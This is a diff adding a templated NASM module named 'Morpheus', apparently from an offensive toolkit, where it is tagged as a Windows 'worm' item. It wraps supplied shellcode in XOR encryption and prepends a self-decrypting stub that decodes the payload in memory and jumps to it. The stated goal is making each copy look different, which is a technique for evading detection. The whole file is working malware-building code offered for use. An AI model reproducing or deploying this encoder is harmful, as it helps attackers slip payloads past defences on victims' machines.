@@ -1,0 +1,74 @@
+#!name##Morpheus
+#!itemType##worm
+#!info##Converts pre-made shellcode into polymorphic shellcode encrypted with an XOR key. Accepts the pre-made shellcode as a payload.
+#!info## Transforms shellcode without changing its behavior. It encrypts the bytes using an XOR key, making the shellcode polymorphic. Upon execution, the shellcode decrypts itself and runs. This increases the shellcode size by approximately 50–60 bytes. Using different XOR keys completely changes the shellcode’s appearance.
+#!lang##nasm
+#!itemTags##WIN
+#!payloadSpace##MP_shellcode##Ready shellcode
+#!Var##MP_key##abcd##Shellcode encryption key. Uses XOR for encryption and decryption. Ex: 'dOhjKKem', 'abcdefg', 'dpHJuuBN' etc.##str
+#!Wprocess##WinShell
+#!wormCompiler##SC_WIN64
+
+
+{% set MORPHEUS_KEY = shTOOL.DaleBuildKey(MP_key) %}
+
+{% set MORPHEUS_SHELLCODE = scTOOL.PutShellcode(MP_shellcode) %}
+
+BITS 64
+
+
+section .text
+global main
+main:
+    jmp GetShellcode
+
+Archon:
+    pop rsi ; save shellcode
+    mov r10, rsi
+
+    xor rax, rax    ; shellcode index
+    xor rcx, rcx
+    xor rbx, rbx
+GetKey:
+    call SetKey
+    Key:
+        db {{ shTOOL.DaleKey(MORPHEUS_KEY, False)}}
+    Key_end: equ $ - Key
+
+SetKey:
+    pop rdi ; save key
+    xor rdx, rdx    ; key index
+
+    
+Decrypt:
+    mov byte cl, [rsi]
+    mov byte bl, [rdi]
+    xor cl, bl
+    mov byte [rsi], cl
+    inc rax
+    inc rdx
+    inc rsi
+    inc rdi
+    
+    ;check shellcode
+    cmp rax, ShellcodeEnd
+    je Execute
+    
+    ; check key index
+    cmp rdx, Key_end
+    je GetKey
+    jmp Decrypt
+    
+    
+
+Execute:
+    jmp r10   
+    
+
+
+GetShellcode:
+    call Archon
+Shellcode:
+    db {{scTOOL.scodeXOR(MORPHEUS_SHELLCODE, MORPHEUS_KEY)}}
+
+ShellcodeEnd: equ $ - Shellcode
